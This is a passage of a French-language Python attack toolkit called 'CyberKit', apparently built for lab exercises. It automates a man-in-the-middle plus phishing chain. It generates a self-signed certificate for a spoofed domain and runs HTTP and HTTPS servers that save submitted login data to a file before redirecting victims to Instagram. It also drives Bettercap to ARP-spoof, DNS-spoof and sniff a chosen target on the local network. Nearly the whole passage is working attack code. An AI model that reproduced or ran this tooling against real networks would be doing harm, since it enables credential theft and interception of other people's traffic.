    def do_GET(self):
        if self.path == '/': self.path = '/login.html'
        return super().do_GET()
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        print(f'\\n\\033[91m[CREDS] {{data}}\\033[0m\\n')
        with open('{state.creds_file}', 'a') as f:
            f.write(f'[{{datetime.datetime.now()}}] {{data}}\\n')
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com')
        self.end_headers()
os.chdir('{state.phish_www}')
s = http.server.HTTPServer(('0.0.0.0', 443), H)
c = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
c.load_cert_chain('{state.cert_path}', '{state.key_path}')
s.socket = c.wrap_socket(s.socket, server_side=True)
print('Serveur HTTPS actif sur le port 443...')
s.serve_forever()
"""
            try:
                run(f"python3 -c \"{server_code}\"", capture=False, timeout=3600)
            except KeyboardInterrupt:
                pass

        elif c == "4":
            section_header("Génération de certificat SSL")
            domain = get_input("Domaine", state.spoof_domain)
            gen_cert(domain)
            pause()

        elif c == "5":
            section_header("Chemin Zphisher")
            path = get_input("Chemin vers Zphisher", os.path.expanduser("~/Documents/zphisher"))
            if os.path.isdir(path):
                state.zphisher_path = path
                www = os.path.join(path, ".server", "www")
                if os.path.isdir(www):
                    state.phish_www = www
                    print_success(f"Zphisher : {path}")
                    print_success(f"Pages web : {www}")
                else:
                    print_success(f"Zphisher trouvé : {path}")
                    print_warning("Dossier .server/www absent — lance Zphisher une première fois")
            else:
                print_error(f"Dossier non trouvé : {path}")
            pause()

        elif c == "6":
            section_header("Identifiants capturés")
            if os.path.isfile(state.creds_file):
                with open(state.creds_file, "r") as f:
                    content = f.read()
                if content.strip():
                    print(content)
                else:
                    print_info("Fichier vide — aucun identifiant capturé pour le moment")
            else:
                print_info("Aucun identifiant capturé pour le moment")
            pause()


def gen_cert(domain):
    """Génère un certificat auto-signé."""
    cmd = (
        f'openssl req -new -x509 -days 365 -nodes '
        f'-out {state.cert_path} -keyout {state.key_path} '
        f'-subj "/CN={domain}" 2>/dev/null'
    )
    run(cmd)
    if os.path.isfile(state.cert_path):
        print_success(f"Certificat généré pour {domain}")
        print_info(f"  Cert : {state.cert_path}")
        print_info(f"  Clé  : {state.key_path}")
    else:
        print_error("Échec de la génération du certificat")


# ============================================================
# MODULE 4 — MITM (TP4)
# ============================================================
def mod_mitm():
    while True:
        banner()
        menu_header("MODULE 4 — MAN IN THE MIDDLE (TP4)")

        print(f"    {C.DIM}IP : {state.my_ip or '—'}  |  Gateway : {state.gateway or '—'}  |  Cible : {state.target_ip or '—'}{C.RESET}")
        print()

        menu_option("1", "Configurer la cible")
        menu_option("2", "Lancer Bettercap (interactif)")
        menu_option("3", "ARP Spoofing + Sniffing (auto)")
        menu_option("4", "ARP Spoofing + DNS Spoofing + Sniffing (auto)")
        menu_option("5", "Activer/Désactiver IP forwarding")
        menu_option("6", "Changer le domaine à spoofer")
        menu_back()
        menu_quit()

        c = get_choice()

        if c == "0":
            return
        elif c == "q":
            cleanup_and_exit()

        elif c == "1":
            section_header("Configuration de la cible")

            print_status("Scan rapide du réseau...")
            print()
            out = run(f"nmap -sn {state.subnet}", timeout=30)
            if out:
                print(out)
            print()

            state.target_ip = get_input("IP de la cible", state.target_ip)
            state.gateway = get_input("IP de la gateway", state.gateway)
            print_success(f"Cible : {state.target_ip}")
            print_success(f"Gateway : {state.gateway}")
            pause()

        elif c == "2":
            section_header("Bettercap — Mode interactif")
            if not check_tool("bettercap"):
                print_error("Bettercap n'est pas installé")
                print_info("sudo apt install bettercap")
                pause()
                continue
            print_warning("Bettercap va prendre le contrôle du terminal. Tapez 'exit' ou Ctrl+C pour revenir.")
            pause()
            os.system(f"bettercap -iface {state.iface}")

        elif c == "3":
            section_header("ARP Spoofing + Sniffing")
            if not state.target_ip:
                print_error("Configure d'abord la cible (option 1)")
                pause()
                continue
            if not check_tool("bettercap"):
                print_error("Bettercap n'est pas installé")
                pause()
                continue

            enable_forwarding()

            eval_cmd = (
                f"set arp.spoof.targets {state.target_ip};"
                f"set arp.spoof.gateway {state.gateway};"
                f"set arp.spoof.internal true;"
                f"arp.spoof on;"
                f"set net.sniff.local true;"
                f"net.sniff on"
            )

            print_status(f"Cible : {state.target_ip}")
            print_status(f"Gateway : {state.gateway}")
            print_success("ARP Spoofing + Sniffing lancé")
            print_warning("Ctrl+C pour arrêter")
            print()

            os.system(f"bettercap -iface {state.iface} -eval \"{eval_cmd}\"")
            pause()

        elif c == "4":
            section_header("ARP Spoofing + DNS Spoofing + Sniffing")
            if not state.target_ip:
                print_error("Configure d'abord la cible (option 1)")
                pause()
                continue
            if not check_tool("bettercap"):
                print_error("Bettercap n'est pas installé")
                pause()
                continue

            enable_forwarding()
            domain = get_input("Domaine(s) à spoofer", state.spoof_domain)
            state.spoof_domain = domain

            eval_cmd = (
                f"set arp.spoof.targets {state.target_ip};"
                f"set arp.spoof.gateway {state.gateway};"
                f"set arp.spoof.internal true;"
                f"arp.spoof on;"
                f"set net.sniff.local true;"
                f"net.sniff on;"
                f"set dns.spoof.domains {domain};"
                f"set dns.spoof.address {state.my_ip};"
                f"dns.spoof on"
            )

            print_status(f"Cible : {state.target_ip}")
            print_status(f"Gateway : {state.gateway}")
            print_status(f"DNS spoof : {domain} → {state.my_ip}")
            print_success("ARP + DNS Spoofing + Sniffing lancé")
            print_warning("Ctrl+C pour arrêter")
            print()

            os.system(f"bettercap -iface {state.iface} -eval \"{eval_cmd}\"")
            pause()

        elif c == "5":
            current = run("cat /proc/sys/net/ipv4/ip_forward")
            status = "activé" if current == "1" else "désactivé"
            print_info(f"IP forwarding actuellement : {status}")
            toggle = get_input("Activer (1) ou Désactiver (0) ?", "1")
            run(f"sysctl -w net.ipv4.ip_forward={toggle}")
            print_success(f"IP forwarding {'activé' if toggle == '1' else 'désactivé'}")
            pause()

        elif c == "6":
            state.spoof_domain = get_input("Domaine(s) à spoofer", state.spoof_domain)
            print_success(f"Domaine : {state.spoof_domain}")
            pause()


def enable_forwarding():
    current = run("cat /proc/sys/net/ipv4/ip_forward")
    if current != "1":
        state.forwarding_was_enabled = False
        run("sysctl -w net.ipv4.ip_forward=1")
        print_success("IP forwarding activé")
    else:
        state.forwarding_was_enabled = True


# ============================================================
# MODULE 5 — ATTAQUE COMPLÈTE (AUTO)
# ============================================================
def mod_full_attack():
    banner()
    section_header("ATTAQUE COMPLÈTE — MITM + PHISHING + HTTPS")

    print_warning("Ce module lance automatiquement toute la chaîne d'attaque :")
    print()
    print(f"    {C.CYAN}1.{C.RESET} Activation IP forwarding")
    print(f"    {C.CYAN}2.{C.RESET} Génération certificat HTTPS")
    print(f"    {C.CYAN}3.{C.RESET} Serveur phishing HTTP (80) + HTTPS (443)")
    print(f"    {C.CYAN}4.{C.RESET} Bettercap : ARP spoof + DNS spoof + sniffing")
    print()

    # Vérifications
    if not state.phish_www:
        print_error("Pages phishing non trouvées. Lance d'abord Zphisher (Module 3 > Option 1)")
        pause()
        return

    if not check_tool("bettercap"):
        print_error("Bettercap non installé")
        pause()
        return

    # Config
    if not state.target_ip:
        print_status("Scan rapide du réseau...")
        out = run(f"nmap -sn {state.subnet}", timeout=30)
        if out:
            print(out)
        print()
        state.target_ip = get_input("IP de la cible")
        if not state.target_ip:
            return

    state.gateway = get_input("Gateway", state.gateway)
    state.spoof_domain = get_input("Domaine à spoofer", state.spoof_domain)

    print()
    print(f"  {C.BOLD}╔{'═' * 50}╗{C.RESET}")
    print(f"  {C.BOLD}║{C.RESET}  {C.RED}RÉCAPITULATIF{C.RESET}")
    print(f"  {C.BOLD}║{C.RESET}  Attaquant  : {state.my_ip}")
    print(f"  {C.BOLD}║{C.RESET}  Cible      : {state.target_ip}")
    print(f"  {C.BOLD}║{C.RESET}  Gateway    : {state.gateway}")
    print(f"  {C.BOLD}║{C.RESET}  Domaine    : {state.spoof_domain} → {state.my_ip}")
    print(f"  {C.BOLD}║{C.RESET}  Phishing   : {state.phish_www}")
    print(f"  {C.BOLD}╚{'═' * 50}╝{C.RESET}")
    print()

    confirm = get_input("Lancer l'attaque ? (o/n)", "o")
    if confirm != "o":
        return

    # 1. IP forwarding
    print()
    print_status("[1/4] Activation IP forwarding...")
    enable_forwarding()

    # 2. Certificat
    print_status("[2/4] Génération du certificat HTTPS...")
    gen_cert(state.spoof_domain)

    # 3. Serveurs phishing
    print_status("[3/4] Lancement des serveurs phishing...")

    http_script = f"""
import http.server, os, datetime
class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/': self.path = '/login.html'
        return super().do_GET()
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        with open('{state.creds_file}', 'a') as f:
            f.write(f'[HTTP][{{datetime.datetime.now()}}] {{data}}\\n')
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com')
        self.end_headers()
    def log_message(self, format, *args): pass
os.chdir('{state.phish_www}')
http.server.HTTPServer(('0.0.0.0', 80), H).serve_forever()
"""

    https_script = f"""
import http.server, ssl, os, datetime
class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/': self.path = '/login.html'
        return super().do_GET()
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        with open('{state.creds_file}', 'a') as f:
            f.write(f'[HTTPS][{{datetime.datetime.now()}}] {{data}}\\n')
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com')
        self.end_headers()
    def log_message(self, format, *args): pass
os.chdir('{state.phish_www}')
s = http.server.HTTPServer(('0.0.0.0', 443), H)
c = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
c.load_cert_chain('{state.cert_path}', '{state.key_path}')
s.socket = c.wrap_socket(s.socket, server_side=True)
s.serve_forever()
"""

    # Écrire les scripts temporaires
    with open("/tmp/ck_http.py", "w") as f:
        f.write(http_script)
    with open("/tmp/ck_https.py", "w") as f:
        f.write(https_script)

    run_bg("python3 /tmp/ck_http.py")
    print_success("  Serveur HTTP  → port 80")
    run_bg("python3 /tmp/ck_https.py")
    print_success("  Serveur HTTPS → port 443")

    time.sleep(1)

    # 4. Bettercap
    print_status("[4/4] Lancement de Bettercap...")
    print()
    print(f"  {C.RED}{C.BOLD}{'=' * 50}{C.RESET}")
    print(f"  {C.RED}{C.BOLD}  ATTAQUE EN COURS — Ctrl+C pour tout arrêter{C.RESET}")
    print(f"  {C.RED}{C.BOLD}{'=' * 50}{C.RESET}")
    print()
    print_info(f"Credentials enregistrés dans : {state.creds_file}")
    print()

    eval_cmd = (
        f"set arp.spoof.targets {state.target_ip};"
        f"set arp.spoof.gateway {state.gateway};"
        f"set arp.spoof.internal true;"
        f"arp.spoof on;"
        f"set net.sniff.local true;"
        f"net.sniff on;"
        f"set dns.spoof.domains {state.spoof_domain};"
        f"set dns.spoof.address {state.my_ip};"
        f"dns.spoof on"
    )

    os.system(f"bettercap -iface {state.iface} -eval \"{eval_cmd}\"")

    # Nettoyage
    print()
    print_status("Nettoyage...")
    cleanup_processes()
    if not state.forwarding_was_enabled:
        run("sysctl -w net.ipv4.ip_forward=0")
        print_success("IP forwarding désactivé")

    if os.path.isfile(state.creds_file):
        print()
        print_success("Identifiants capturés :")
        with open(state.creds_file, "r") as f:
            print(f.read())

    pause()


# ============================================================
# NETTOYAGE
# ============================================================
def cleanup_processes():
    for p in state.processes:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    state.processes.clear()

def cleanup_and_exit():
    print()
    print_status("Arrêt de CyberKit...")
    cleanup_processes()
    # Cleanup temp files
    for f in ["/tmp/ck_http.py", "/tmp/ck_https.py"]:
        if os.path.isfile(f):
            os.remove(f)
    if not state.forwarding_was_enabled:
        run("sysctl -w net.ipv4.ip_forward=0 2>/dev/null")
    print_success("Nettoyage terminé. À bientôt !")
    print()
    sys.exit(0)


# ============================================================
# MENU PRINCIPAL
# ============================================================
def main():
    check_root()
    detect_network()
    find_cupp()
    find_zphisher()

    signal.signal(signal.SIGINT, lambda s, f: None)  # Ignore Ctrl+C dans les menus

    while True:
        banner()

        # Status bar
        ip_col = C.GREEN if state.my_ip else C.RED
        gw_col = C.GREEN if state.gateway else C.RED
        tg_col = C.GREEN if state.target_ip else C.DIM

        print(f"  {C.DIM}┌─ Session ──────────────────────────────────────────┐{C.RESET}")
        print(f"  {C.DIM}│{C.RESET} IP: {ip_col}{state.my_ip or '—'}{C.RESET}  GW: {gw_col}{state.gateway or '—'}{C.RESET}  Target: {tg_col}{state.target_ip or '—'}{C.RESET}  {C.DIM}│{C.RESET}")
        print(f"  {C.DIM}└────────────────────────────────────────────────────┘{C.RESET}")

        menu_header("MENU PRINCIPAL")
        menu_option("1", f"Reconnaissance    {C.DIM}(nmap, scan réseau, ports, OS){C.RESET}")
        menu_option("2", f"Brute Force       {C.DIM}(hydra, hashcat, john, crunch){C.RESET}")
        menu_option("3", f"Phishing          {C.DIM}(zphisher, serveur HTTP/HTTPS){C.RESET}")
        menu_option("4", f"Man In The Middle  {C.DIM}(bettercap, ARP/DNS spoof){C.RESET}")
        print()
        menu_option("5", f"{C.RED}{C.BOLD}Attaque complète  {C.DIM}(MITM + Phishing + HTTPS auto){C.RESET}")
        print()
        menu_option("s", f"{C.DIM}Afficher l'état de la session{C.RESET}")
        menu_quit()

        c = get_choice()

        if c == "1":
            mod_recon()
        elif c == "2":
            mod_bruteforce()
        elif c == "3":
            mod_phishing()
        elif c == "4":
            mod_mitm()
        elif c == "5":
            mod_full_attack()
        elif c == "s":
            show_state()
            pause()
        elif c == "q":
            cleanup_and_exit()


if __name__ == "__main__":
    main()
